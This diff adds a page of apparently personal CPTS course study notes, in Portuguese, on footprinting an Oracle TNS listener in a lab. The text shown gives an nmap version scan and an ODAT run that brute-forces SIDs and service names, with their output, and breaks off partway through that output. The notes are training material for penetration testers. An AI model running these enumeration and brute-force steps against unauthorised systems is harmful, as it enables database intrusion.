@@ -1,0 +1,1631 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Writeups do curso preparatório CPTS">
+      
+      
+        <meta name="author" content="Matheus Navarro de Franca">
+      
+      
+        <link rel="canonical" href="https://thewzz.github.io/cpts-writeups/notes/footprinting/oracle-tns/">
+      
+      
+        <link rel="prev" href="../smtp/">
+      
+      
+        <link rel="next" href="../ipmi/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>ORACLE TNS - CPTS Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="../../../stylesheets/home.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#oracle-tns-estudo-footprinting" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="CPTS Writeups" class="md-header__button md-logo" aria-label="CPTS Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CPTS Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              ORACLE TNS
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="teal"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="CPTS Writeups" class="md-nav__button md-logo" aria-label="CPTS Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    CPTS Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Máquinas
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Máquinas
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../machines/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Índice
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_2" id="__nav_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Concluídos
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Concluídos
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_2_1" id="__nav_1_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Easy
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../machines/getting-started/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Getting Started
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../machines/robot/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Robot
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../machines/cap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CAP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../machines/dancing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dancing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../machines/redeemer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Redeemer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_3" id="__nav_1_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Em Andamento
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Em Andamento
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1_3_1" id="__nav_1_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Easy
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Easy
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../machines/silentium/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Silentium
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../machines/facts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Facts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anotações
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Anotações
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Estudos Footprinting
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Estudos Footprinting
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../smb-client/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMB Client
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../smtp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SMTP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ORACLE TNS
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ORACLE TNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracao" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeração
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeração">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-scan-oracle-tns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Scan Oracle TNS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-enumeracao-odat-sids-e-service-names" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Enumeração ODAT - SIDs e Service Names
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-enumeracao-odat-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Enumeração ODAT - Credentials
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-conexao-sqlplus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Conexão SQLPlus
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-enumeracao-de-tabelas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Enumeração de Tabelas
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-verificacao-de-permissoes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Verificação de Permissões
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-conexao-como-sysdba" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Conexão como SYSDBA
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#8-enumeracao-de-hashes-de-senha" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Enumeração de Hashes de Senha
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resumo
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#referencias" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Referências
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ipmi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IPMI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracao" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Enumeração
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Enumeração">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-scan-oracle-tns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Scan Oracle TNS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-enumeracao-odat-sids-e-service-names" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Enumeração ODAT - SIDs e Service Names
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-enumeracao-odat-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. Enumeração ODAT - Credentials
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-conexao-sqlplus" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. Conexão SQLPlus
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-enumeracao-de-tabelas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Enumeração de Tabelas
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-verificacao-de-permissoes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Verificação de Permissões
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#7-conexao-como-sysdba" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Conexão como SYSDBA
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#8-enumeracao-de-hashes-de-senha" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Enumeração de Hashes de Senha
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Resumo
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#referencias" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Referências
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="oracle-tns-estudo-footprinting">🏴️ ORACLE TNS — Estudo Footprinting</h1>
+<hr />
+<h2 id="enumeracao">Enumeração</h2>
+<h3 id="1-scan-oracle-tns">1. Scan Oracle TNS</h3>
+<p>Aqui estou fazendo um scan inicial para identificar o serviço Oracle TNS e sua versão.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>sudo nmap -p1521 -sV 10.129.97.235 --open
+</code></pre></div>
+<p><strong>Retorno:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-19 13:50 CDT
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Nmap scan report for 10.129.97.235
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>Host is up (0.0073s latency).
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>PORT     STATE SERVICE    VERSION
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds
+</code></pre></div>
+<p><strong>Informações coletadas:</strong>
+- Versão: Oracle TNS listener 11.2.0.2.0
+- Porta: 1521/TCP</p>
+<h3 id="2-enumeracao-odat-sids-e-service-names">2. Enumeração ODAT - SIDs e Service Names</h3>
+<p>Agora vou utilizar o ODAT (Oracle Database Attacking Tool) para enumerar SIDs e service names válidos.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>./odat.py all -s 10.129.97.235
+</code></pre></div>
+<p><strong>Retorno:</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>[+] Target: 10.129.97.235:1521 [all]
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>[+] Checking if target 10.129.97.235:1521 is well configured for a connection...
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>[+] According to a test, the TNS listener 10.129.97.235:1521 is well configured. Continue...
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>[1] (10.129.97.235:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>[2] (10.129.97.235:1521): Searching valid SIDs
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>[2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.97.235:1521 server
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>[+] &#39;XE&#39; is a valid SID. Continue...                                                                                          
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>100% |#######################################################################################################| Time: 00:00:12 
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>[2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.97.235:1521)
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>100% |#######################################################################################################| Time: 00:00:00 
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>[2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.97.235:1521)
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>[+] &#39;XE&#39; is a valid SID. Continue...                                                                                          
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>100% |#######################################################################################################| Time: 00:00:11 
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>[+] SIDs found on the 10.129.97.235:1521 server: XE
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>[3] (10.129.97.235:1521): Searching valid Service Names
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>[3.1] Searching valid Service Names thanks to a well known Service Name list on the 10.129.97.235:1521 server
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>[+] &#39;XE&#39; is a valid Service Name. Continue...                                                                                 
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>[+] &#39;XEXDB&#39; is a valid Service Name. Continue...                                                                              
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>100% |#######################################################################################################| Time: 00:00:14
